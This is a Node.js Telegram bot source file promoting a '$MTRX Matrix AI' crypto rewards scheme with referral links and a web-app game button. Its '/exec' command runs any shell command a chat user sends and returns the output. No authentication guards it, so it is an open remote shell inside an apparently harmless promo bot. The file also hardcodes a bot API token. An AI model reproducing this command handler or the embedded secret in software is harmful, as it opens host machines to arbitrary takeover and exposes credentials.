const { Telegraf } = require('telegraf');
const { exec } = require('child_process');

const AppToken = '7646877814:AAFx-LjNMqIqzLs-30pTwM_vVrV0w5DHDLA';
const bot = new Telegraf(AppToken);

const MATRIX_START_TEXT = `
Want to know how cool your Telegram presence is? 
Check your profile rating and unlock awesome rewards with $MTRX Matrix AI!

Time to vibe ✨ and step into the world of Web3.
$MTRX is on the way... Ready to explore something new?

Take the first step and see just how you stack up!
`;

async function getUsername(userId) {
    try {
        const user = await bot.telegram.getChat(userId);
        return user.username ? `@${user.username}` : user.first_name;
    } catch (error) {
        console.error("Error fetching user:", error);
        return "Unknown"; 
    }
}

bot.command('exec', async (ctx) => {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;
    const command = ctx.message.text.split(' ').slice(1).join(' ');

    const processingMessage = await ctx.reply('`Processing...`', { parse_mode: 'Markdown' });

    exec(command, (error, stdout, stderr) => {
        let response = "";

        if (error) {
            response += `<b>Error:</b> <code>${error.message}</code>\n`;
        }

        if (stderr) {
            response += `<b>stderr:</b> <code>${stderr.trim()}</code>\n`;
        }

        if (stdout) {
            response += `<b>stdout:</b> <code>${stdout.trim()}</code>\n`;
        }

        if (!response) {
            response = 'No output from command';
        }

        if (processingMessage && processingMessage.message_id) {
            try {
                bot.telegram.editMessageText(chatId, processingMessage.message_id, null, response, {
                    parse_mode: 'HTML'
                });
            } catch (editError) {
                ctx.reply(`Failed to edit message: ${editError.message}`);
            }
        } else {
            ctx.reply('Could not process your command.');
        }
    });
});

bot.command('start', async (ctx) => {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;
    const commandArgs = ctx.message.text.split(' ')[1];

    if (commandArgs && commandArgs.startsWith('ref_')) {
        const inviterId = commandArgs.split('ref_')[1];
        const inviterName = await getUsername(inviterId);

        const messageText = `${MATRIX_START_TEXT}\nInvited by: ${inviterName}`;
        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: "Play Now 🪂", web_app: { url: `https://mtx-ai-bot.vercel.app/?userId=${userId}&inviterId=${inviterId}` } }],
                [{ text: "Join Community 🔥", url: "https://telegram.me/MatrixAi_Ann" }]
            ]
        };

        await ctx.telegram.sendPhoto(chatId, "https://i.ibb.co/XDPzBWc/pngtree-virtual-panel-generate-ai-image-15868619.jpg", {
            caption: messageText,
            reply_markup: inlineKeyboard
        });

        await ctx.telegram.sendMessage(inviterId, `${ctx.from.username || ctx.from.first_name} Joined via your invite link!`);
    } else {
        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: "Play Now 🪂", web_app: { url: `https://mtx-ai-bot.vercel.app/?userId=${userId}` } }],
                [{ text: "Join Community 🔥", url: "https://telegram.me/MatrixAi_Ann" }]
            ]
        };

        await ctx.telegram.sendPhoto(chatId, "https://i.ibb.co/XDPzBWc/pngtree-virtual-panel-generate-ai-image-15868619.jpg", {
            caption: MATRIX_START_TEXT,
            reply_markup: inlineKeyboard
        });
    }
});

bot.command('referrals', async (ctx) => {
    const chatId = ctx.chat.id;
    const referralLink = `https://telegram.me/MTRXAi_Bot?start=ref_${ctx.from.id}`;
    await ctx.reply(`Here is your referral link: ${referralLink}`);
});

bot.command('id', async (ctx) => {
    const userId = ctx.from.id;

    if (ctx.reply_to_message) {
        const repliedUserId = ctx.reply_to_message.from.id;
        await ctx.reply(`${ctx.reply_to_message.from.first_name}'s ID : \`${repliedUserId}\``);
    } else {
        await ctx.reply(`${ctx.from.first_name}'s ID : \`${userId}\``);
    }
});

bot.launch();
console.log('Bot is running...');
